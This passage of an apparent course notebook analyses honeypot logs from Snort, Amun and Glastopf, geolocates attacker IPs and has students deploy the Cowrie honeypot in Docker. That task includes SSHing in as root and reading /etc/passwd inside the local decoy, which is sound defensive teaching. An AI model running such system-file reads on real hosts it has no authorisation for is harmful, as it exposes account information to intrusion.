       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>channel</th>\n",
       "      <th>classification</th>\n",
       "      <th>date</th>\n",
       "      <th>destination_ip</th>\n",
       "      <th>destination_port</th>\n",
       "      <th>header</th>\n",
       "      <th>normalized</th>\n",
       "      <th>priority</th>\n",
       "      <th>proto</th>\n",
       "      <th>sensor</th>\n",
       "      <th>signature</th>\n",
       "      <th>source_ip</th>\n",
       "      <th>source_port</th>\n",
       "      <th>timestamp</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>snort.alerts</td>\n",
       "      <td>Misc activity</td>\n",
       "      <td>2014-09-28T14:49:43.391463</td>\n",
       "      <td>172.31.13.124</td>\n",
       "      <td>NaN</td>\n",
       "      <td>1:486:4</td>\n",
       "      <td>True</td>\n",
       "      <td>3</td>\n",
       "      <td>ICMP</td>\n",
       "      <td>139cfdf2-471e-11e4-9ee4-0a0b6e7c3e9e</td>\n",
       "      <td>ICMP Destination Unreachable Communication wit...</td>\n",
       "      <td>201.158.32.1</td>\n",
       "      <td>NaN</td>\n",
       "      <td>2014-09-28T14:49:37.787+0000</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "        channel classification                        date destination_ip  \\\n",
       "0  snort.alerts  Misc activity  2014-09-28T14:49:43.391463  172.31.13.124   \n",
       "\n",
       "  destination_port   header  normalized priority proto  \\\n",
       "0              NaN  1:486:4        True        3  ICMP   \n",
       "\n",
       "                                 sensor  \\\n",
       "0  139cfdf2-471e-11e4-9ee4-0a0b6e7c3e9e   \n",
       "\n",
       "                                           signature     source_ip  \\\n",
       "0  ICMP Destination Unreachable Communication wit...  201.158.32.1   \n",
       "\n",
       "  source_port                     timestamp  \n",
       "0         NaN  2014-09-28T14:49:37.787+0000  "
      ]
     },
     "execution_count": 58,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "snort_df.head(1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Question]**\n",
    "1. What is snort? How/would you use this in a production enterprise?  \n",
    "2. Describe the features (columns) in the snort dataframe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "40446"
      ]
     },
     "execution_count": 59,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(snort_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "channel                0\n",
       "classification         0\n",
       "date                   0\n",
       "destination_ip         0\n",
       "destination_port    9483\n",
       "header                 0\n",
       "normalized             0\n",
       "priority               0\n",
       "proto                  0\n",
       "sensor                 0\n",
       "signature              0\n",
       "source_ip              0\n",
       "source_port         9483\n",
       "timestamp              0\n",
       "dtype: int64"
      ]
     },
     "execution_count": 61,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "snort_df.isnull().sum()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [],
   "source": [
    "snort_df = snort_df.drop(['channel'], axis=1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Potentially Bad Traffic        30953\n",
       "Misc activity                   9483\n",
       "Attempted Denial of Service       10\n",
       "Name: classification, dtype: int64"
      ]
     },
     "execution_count": 64,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "snort_df.classification.value_counts()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Question]**\n",
    "1.  What does snort classify as Potentially Bad Traffic, Misc activity, and Attempted Denial of Service?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(30953, 13)"
      ]
     },
     "execution_count": 65,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "bad_traffic = snort_df[snort_df['classification']=='Potentially Bad Traffic']\n",
    "bad_traffic.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "BAD-TRAFFIC same SRC/DST                                   29418\n",
       "ET POLICY Unusual number of DNS No Such Name Responses      1488\n",
       "ET POLICY Unusual number of DNS No Such Name Responses        47\n",
       "Name: signature, dtype: int64"
      ]
     },
     "execution_count": 68,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "bad_traffic.signature.value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>classification</th>\n",
       "      <th>date</th>\n",
       "      <th>destination_ip</th>\n",
       "      <th>destination_port</th>\n",
       "      <th>header</th>\n",
       "      <th>normalized</th>\n",
       "      <th>priority</th>\n",
       "      <th>proto</th>\n",
       "      <th>sensor</th>\n",
       "      <th>signature</th>\n",
       "      <th>source_ip</th>\n",
       "      <th>source_port</th>\n",
       "      <th>timestamp</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>Potentially Bad Traffic</td>\n",
       "      <td>2014-09-29T00:08:37.549292</td>\n",
       "      <td>172.31.14.66</td>\n",
       "      <td>54567</td>\n",
       "      <td>1:2003195:5</td>\n",
       "      <td>True</td>\n",
       "      <td>2</td>\n",
       "      <td>UDP</td>\n",
       "      <td>5cda4a12-4730-11e4-9ee4-0a0b6e7c3e9e</td>\n",
       "      <td>ET POLICY Unusual number of DNS No Such Name R...</td>\n",
       "      <td>172.31.0.2</td>\n",
       "      <td>53</td>\n",
       "      <td>2014-09-29T00:08:23.004+0000</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "            classification                        date destination_ip  \\\n",
       "9  Potentially Bad Traffic  2014-09-29T00:08:37.549292   172.31.14.66   \n",
       "\n",
       "  destination_port       header  normalized priority proto  \\\n",
       "9            54567  1:2003195:5        True        2   UDP   \n",
       "\n",
       "                                 sensor  \\\n",
       "9  5cda4a12-4730-11e4-9ee4-0a0b6e7c3e9e   \n",
       "\n",
       "                                           signature   source_ip source_port  \\\n",
       "9  ET POLICY Unusual number of DNS No Such Name R...  172.31.0.2          53   \n",
       "\n",
       "                      timestamp  \n",
       "9  2014-09-29T00:08:23.004+0000  "
      ]
     },
     "execution_count": 69,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "bad_traffic.head(1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Section 2 Questions\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Question]**\n",
    "1. Describe what you learned from looking at this honeypot data\n",
    "2. What is missing?  What did you expect?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Section 3: Further Applications"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- https://dev.maxmind.com/geoip/geoip2/geolite2/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "metadata": {},
   "outputs": [],
   "source": [
    "import geoip2.database\n",
    "\n",
    "geo = geoip2.database.Reader('GeoLite2-City.mmdb')\n",
    "\n",
    "# amun_df['attackerCountry'] = amun_df['attackerIP'].apply(lambda x: (reader.city(x).subdivisions.most_specific.name) if (reader.city(x)) else None )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 92,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_state(ip):\n",
    "    try:\n",
    "        response = geo.city(ip)\n",
    "        return response.subdivisions.most_specific.name\n",
    "    except:\n",
    "        return pd.np.nan"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 86,
   "metadata": {},
   "outputs": [],
   "source": [
    "amun_df['attackerState'] = amun_df['attackerIP'].apply(get_state)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 91,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Zhejiang                                           55282\n",
       "Jiangsu                                            21802\n",
       "Central Singapore Community Development Council    21552\n",
       "New York                                           17882\n",
       "Missouri                                           13068\n",
       "Name: attackerCountry, dtype: int64"
      ]
     },
     "execution_count": 91,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "amun_df.attackerCountry.value_counts()[:5]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Challenge Task]** \n",
    "- Get the get_lat_long method working.  Then visualize a choropleth plot of all of the data to show where the attackers come from."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_lat_long(ip):\n",
    "    try:\n",
    "        response = geo.city(ip)\n",
    "        return [response.location.latitude, response.location.longitude]\n",
    "    except:\n",
    "        return [pd.np.nan, pd.np.nan]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "amun_df['attackerLat'], amun_df['attackerLong'] = amun_df['attackerIP'].apply(get_lat_long)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>attackerID</th>\n",
       "      <th>attackerIP</th>\n",
       "      <th>attackerPort</th>\n",
       "      <th>channel</th>\n",
       "      <th>connectionType</th>\n",
       "      <th>downloadMethod</th>\n",
       "      <th>normalized</th>\n",
       "      <th>shellcodeName</th>\n",
       "      <th>timestamp</th>\n",
       "      <th>victimIP</th>\n",
       "      <th>victimPort</th>\n",
       "      <th>vulnName</th>\n",
       "      <th>attackerCountry</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>NaN</td>\n",
       "      <td>162.197.24.67</td>\n",
       "      <td>57230</td>\n",
       "      <td>amun.events</td>\n",
       "      <td>initial</td>\n",
       "      <td>NaN</td>\n",
       "      <td>True</td>\n",
       "      <td>NaN</td>\n",
       "      <td>{'$date': '2014-09-28T04:55:17.147+0000'}</td>\n",
       "      <td>172.31.13.124</td>\n",
       "      <td>80</td>\n",
       "      <td>NaN</td>\n",
       "      <td>Texas</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>NaN</td>\n",
       "      <td>71.6.167.142</td>\n",
       "      <td>44621</td>\n",
       "      <td>amun.events</td>\n",
       "      <td>initial</td>\n",
       "      <td>NaN</td>\n",
       "      <td>True</td>\n",
       "      <td>NaN</td>\n",
       "      <td>{'$date': '2014-09-28T05:05:28.994+0000'}</td>\n",
       "      <td>172.31.13.124</td>\n",
       "      <td>80</td>\n",
       "      <td>NaN</td>\n",
       "      <td>California</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>NaN</td>\n",
       "      <td>71.6.167.142</td>\n",
       "      <td>50861</td>\n",
       "      <td>amun.events</td>\n",
       "      <td>initial</td>\n",
       "      <td>NaN</td>\n",
       "      <td>True</td>\n",
       "      <td>NaN</td>\n",
       "      <td>{'$date': '2014-09-28T06:05:25.530+0000'}</td>\n",
       "      <td>172.31.13.124</td>\n",
       "      <td>80</td>\n",
       "      <td>NaN</td>\n",
       "      <td>California</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>NaN</td>\n",
       "      <td>117.21.173.155</td>\n",
       "      <td>3474</td>\n",
       "      <td>amun.events</td>\n",
       "      <td>initial</td>\n",
       "      <td>NaN</td>\n",
       "      <td>True</td>\n",
       "      <td>NaN</td>\n",
       "      <td>{'$date': '2014-09-28T06:41:41.918+0000'}</td>\n",
       "      <td>172.31.13.124</td>\n",
       "      <td>8080</td>\n",
       "      <td>NaN</td>\n",
       "      <td>Jiangxi</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>NaN</td>\n",
       "      <td>173.193.110.136</td>\n",
       "      <td>3694</td>\n",
       "      <td>amun.events</td>\n",
       "      <td>initial</td>\n",
       "      <td>NaN</td>\n",
       "      <td>True</td>\n",
       "      <td>NaN</td>\n",
       "      <td>{'$date': '2014-09-28T07:26:22.730+0000'}</td>\n",
       "      <td>172.31.13.124</td>\n",
       "      <td>3389</td>\n",
       "      <td>NaN</td>\n",
       "      <td>Texas</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   attackerID       attackerIP  attackerPort      channel connectionType  \\\n",
       "0         NaN    162.197.24.67         57230  amun.events        initial   \n",
       "1         NaN     71.6.167.142         44621  amun.events        initial   \n",
       "2         NaN     71.6.167.142         50861  amun.events        initial   \n",
       "3         NaN   117.21.173.155          3474  amun.events        initial   \n",
       "4         NaN  173.193.110.136          3694  amun.events        initial   \n",
       "\n",
       "  downloadMethod  normalized shellcodeName  \\\n",
       "0            NaN        True           NaN   \n",
       "1            NaN        True           NaN   \n",
       "2            NaN        True           NaN   \n",
       "3            NaN        True           NaN   \n",
       "4            NaN        True           NaN   \n",
       "\n",
       "                                   timestamp       victimIP  victimPort  \\\n",
       "0  {'$date': '2014-09-28T04:55:17.147+0000'}  172.31.13.124          80   \n",
       "1  {'$date': '2014-09-28T05:05:28.994+0000'}  172.31.13.124          80   \n",
       "2  {'$date': '2014-09-28T06:05:25.530+0000'}  172.31.13.124          80   \n",
       "3  {'$date': '2014-09-28T06:41:41.918+0000'}  172.31.13.124        8080   \n",
       "4  {'$date': '2014-09-28T07:26:22.730+0000'}  172.31.13.124        3389   \n",
       "\n",
       "  vulnName attackerCountry  \n",
       "0      NaN           Texas  \n",
       "1      NaN      California  \n",
       "2      NaN      California  \n",
       "3      NaN         Jiangxi  \n",
       "4      NaN           Texas  "
      ]
     },
     "execution_count": 87,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "amun_df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "amun_df['attackerCountry'] = amun_df['attackerIP'].map(unique_ips.apply(get_country))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Time Plots**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [],
   "source": [
    "snort_df['timestamp'] = pd.to_datetime(snort_df['timestamp'])\n",
    "snort_df.set_index('timestamp', inplace=True)\n",
    "\n",
    "glastopf_df['timestamp'] = pd.to_datetime(glastopf_df['timestamp'])\n",
    "glastopf_df.set_index('timestamp', inplace=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/Users/carrie/anaconda/envs/mlbook/lib/python3.5/site-packages/ipykernel/__main__.py:1: FutureWarning: how in .resample() is deprecated\n",
      "the new syntax is .resample(...).count()\n",
      "  if __name__ == '__main__':\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x15f91cc88>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.plot(snort_df['source_ip'].resample(\"D\", how='count'), label=\"Total Events\")\n",
    "plt.legend(bbox_to_anchor=(1.05, 1), loc=2, borderaxespad=0.)    \n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/Users/carrie/anaconda/envs/mlbook/lib/python3.5/site-packages/ipykernel/__main__.py:1: FutureWarning: how in .resample() is deprecated\n",
      "the new syntax is .resample(...).count()\n",
      "  if __name__ == '__main__':\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x15f9d1390>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.plot(glastopf_df['source'].resample(\"D\", how='count'), label=\"Total Events\")\n",
    "plt.legend(bbox_to_anchor=(1.05, 1), loc=2, borderaxespad=0.)    \n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Section 3 Questions"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "1. What other datasets can be used to enrich honeypot data?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Section 4: Deploying Honeypots"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This section explores how to deploy a honeypot on your local machine with Docker"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Readings/Resources** \n",
    "- http://www.isg.rhul.ac.uk/~pnai166/thesis.pdf\n",
    "- Awesome List of Honeypot: https://github.com/paralax/awesome-honeypots\n",
    "- Docker: https://2018.djangocon.us/talk/an-intro-to-docker-for-djangonauts/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Requirements**  \n",
    "- [Docker](https://www.docker.com) must be installed.\n",
    "- https://github.com/cowrie/cowrie"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Cowrie\n",
    "Run Cowrie with Docker  \n",
    "$ docker run -p 2222:2222 cowrie/cowrie"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Question]** What is Cowrie? What are the use cases of it? What kind of information can it collect?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Task]** Take picture of running Cowrie"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Open another terminal and run:   \n",
    "$ ssh -p 2222 root@localhost  \n",
    "**[Task]** Take picture of sshing into cowrie.  Hint: don't worry about the password :) "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Task]** Take picture of running 'cat' on /etc/passwd file"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**[Task/Question]** What is honeypot fingerprinting?  How can you fingerprint cowrie?  Add a snapshot for full credit."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "2. Snare\n",
    "1. git clone https://github.com/mushorg/snare.git"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Section 4 Questions\n",
    "**[Question/Task]**\n",
    "1. Speculate on how researchers can improve honeypots (~2 paragraphs)\n",
    "2. What is honeypot camoflauge?  What ways can camoflauge elements enhance honeypots?"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python [default]",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.5.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
